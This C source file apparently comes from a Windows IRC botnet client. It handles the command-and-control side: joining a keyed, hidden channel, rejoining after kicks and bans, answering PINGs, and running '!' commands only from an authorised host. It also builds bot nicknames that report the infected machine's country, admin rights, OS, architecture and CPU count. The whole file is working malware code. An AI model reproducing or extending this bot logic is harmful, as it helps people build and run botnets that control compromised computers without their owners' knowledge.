#include "../Includes/includes.h"

#ifndef HTTP_BUILD
void SyncIrcVariables() //Defines or Re-Defines some variables for IRC if needed
{
    sprintf(cIrcMotdOne,       " 376 %s",                      cNickname);
    sprintf(cIrcMotdTwo,       " 422 %s",                      cNickname);
    //sprintf(cIrcJoinTopic,     " 332 %s %s :!",     cNickname, cChannel);
    sprintf(cIrcJoinTopic,     " 332 %s ",                     cNickname);
    sprintf(cIrcSetTopic,      "@%s TOPIC %s :!",   cAuthHost, cChannel);
    sprintf(cCommandToChannel, "@%s %s #", cAuthHost, cIrcCommandPrivmsg);
    sprintf(cCommandToMe,      "@%s %s %s :!", cAuthHost, cIrcCommandPrivmsg, cNickname);
}

bool IsValidIrcMotd(char *pcRaw)
{
    bool bReturn = FALSE;

    if((strstr(pcRaw, " :End of /MOTD command."))
            || (strstr(pcRaw, " :MOTD File is missing"))
            || (strstr(pcRaw, " :End of message of the day."))
            || (strstr(pcRaw, "PING 422 MOTD"))
            || (strstr(pcRaw, " :MOTD Not Present"))
            || (strstr(pcRaw, cIrcMotdOne))
            || (strstr(pcRaw, cIrcMotdTwo)))
        bReturn = TRUE;

    return bReturn;
}

void ParseLineFromIrc(char *cIrcRaw) //Handles parsing of individual lines in IRC
{
    if((!strstr(cIrcRaw, " PRIVMSG ")) && (!strstr(cIrcRaw, " NOTICE "))  && (!strstr(cIrcRaw, " TOPIC ")))
    {
        if((strstr(cIrcRaw, cIrcJoinTopic)) && (strstr(cIrcRaw, " :!")))
        {
            pcPartOfLine = strstr(cIrcRaw, " :!") + 3;
            ParseCommand(pcPartOfLine);
        }
        else if(IsValidIrcMotd(cIrcRaw))
        {
            strcpy(cSend, "MODE ");
            strcat(cSend, cNickname);
            strcat(cSend, " +piwksT-x");
            SendToIrc(cSend);

            strcpy(cSend, cIrcCommandJoin);
            strcat(cSend, " ");
            strcat(cSend, cChannel);
            strcat(cSend, " ");

            if(!strstr("0", cChannelKey))
                strcat(cSend, cChannelKey);

            SendToIrc(cSend);

            strcpy(cSend, "MODE ");
            strcat(cSend, cChannel);
            strcat(cSend, " +nTtCVs");

            if(!strstr("0", cChannelKey))
            {
                strcat(cSend, "k ");
                strcat(cSend, cChannelKey);
            }

            SendToIrc(cSend);
        }
        else if(((strstr(cIrcRaw, cNickname)) && (strstr(cIrcRaw, " KICK ")))
                || ((strstr(cIrcRaw, " :You need a registered nick to join that channel.")) && (strstr(cIrcRaw, cChannel)))
                || ((strstr(cIrcRaw, "(IRCops only)")) && (strstr(cIrcRaw, cChannel)))
                || ((strstr(cIrcRaw, "(Admin only)")) && (strstr(cIrcRaw, cChannel)))
                || ((strstr(cIrcRaw, " :Cannot join channel ")) && (strstr(cIrcRaw, cChannel))))
        {
            bAutoRejoinChannel = TRUE;

            strcpy(cSend, cIrcCommandJoin);
            strcat(cSend, " ");
            strcat(cSend, cChannel);
            if(!strstr("0", cChannelKey))
            {
                strcat(cSend, " ");
                strcat(cSend, cChannelKey);
            }
            SendToIrc(cSend);
        }
        else if(strstr(cIrcRaw, "] (Throttled: Reconnecting too fast) ") || strstr(cIrcRaw, "ERROR :Closing Link: "))
        {
            dwConnectionReturn = -1;
            Sleep(GetRandNum(5000) + 2500);
        }
        else if(strstr(cIrcRaw, " :Nickname is already in use."))
        {
            strcpy(cNickname, NewRandomNick());
            SyncIrcVariables();

            strcpy(cSend, cIrcCommandNick);
            strcat(cSend, " ");
            strcat(cSend, cNickname);
            SendToIrc(cSend);
        }
        else if((pcPartOfLine = strstr(cIrcRaw, "PING :")))
        {
            pcPartOfLine += 6;

            strcpy(cSend, cIrcCommandPong);
            strcat(cSend, " :");
            strcat(cSend, pcPartOfLine);
            SendToIrc(cSend);
        }
    }
    else
    {
        if(((strstr(cIrcRaw, cCommandToChannel)) && (strstr(cIrcRaw, " :!"))) || (strstr(cIrcRaw, cCommandToMe))  || (strstr(cIrcRaw, cIrcSetTopic)))
        {
            char cSaveRawContents[DEFAULT];
            strcpy(cSaveRawContents, cIrcRaw);

            if((strstr(cAuthHost, FindInString(cIrcRaw, (char*)"@", (char*)" "))) && (strstr(cSaveRawContents, " :!")))
            {
                pcPartOfLine = strstr(cSaveRawContents, " :!") + 3;

                if(strlen(pcPartOfLine) > 1)
                    ParseCommand(pcPartOfLine);
            }
        }
    }
}

void SendToIrc(char *cIrcRaw) //Sends a given command to IRC
{
    if(bSilent && strstr(cIrcRaw, cIrcCommandPrivmsg))
        return;

    sprintf(cSend, "%s\r\n", cIrcRaw);
#ifdef DEBUG
    printf("%s", cSend);
#endif

    dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
}

char *NewRandomNick() //Returns a computer info based nickname - the argument exists for the below commented function
{
    srand(GenerateRandomSeed());

    char cNicknamePrefix[3];
    if(bNewInstallation)
        strcpy(cNicknamePrefix, "n");

    if(nBootType == 1 || nBootType == 2)
        strcpy(cNicknamePrefix, "s");

    if(bRecoveredProcess)
        strcpy(cNicknamePrefix, "r");

    if(!bRecoveredProcess && !bNewInstallation)
        strcpy(cNicknamePrefix, "_");

#ifdef DEBUG
    strcpy(cNicknamePrefix, "d");
#endif

    char cComputerGender[3];
    if(IsLaptop())
        strcpy(cComputerGender, "L");
    else
        strcpy(cComputerGender, "D");

    char cBits[3];
    if(Is64Bits(GetCurrentProcess()))
        strcpy(cBits, "64");
    else
        strcpy(cBits, "86");

    char cPrivelages[3];
    if(IsAdmin())
        strcpy(cPrivelages, "A");
    else
        strcpy(cPrivelages, "U");

    sprintf(cBuild, "%s[%s|%s|%s|%s|x%s|%ldc]%s", cNicknamePrefix, GetCountry(), cPrivelages, cComputerGender, GetOs(), cBits, GetNumCPUs(), GenRandLCText());

    return cBuild;
}
#endif

char *GetOs()
{
    if(dwOperatingSystem == WINDOWS_UNKNOWN)
        return (char*)"UNKW";
    else if(dwOperatingSystem == WINDOWS_2000)
        return (char*)"W_2K";
    else if(dwOperatingSystem == WINDOWS_XP)
        return (char*)"W_XP";
    else if(dwOperatingSystem == WINDOWS_2003)
        return (char*)"W2K3";
    else if(dwOperatingSystem == WINDOWS_VISTA)
        return (char*)"WVIS";
    else if(dwOperatingSystem == WINDOWS_7)
        return (char*)"WIN7";
    else if(dwOperatingSystem == WINDOWS_8)
        return (char*)"WIN8";

    return (char*)"ERRO";
}
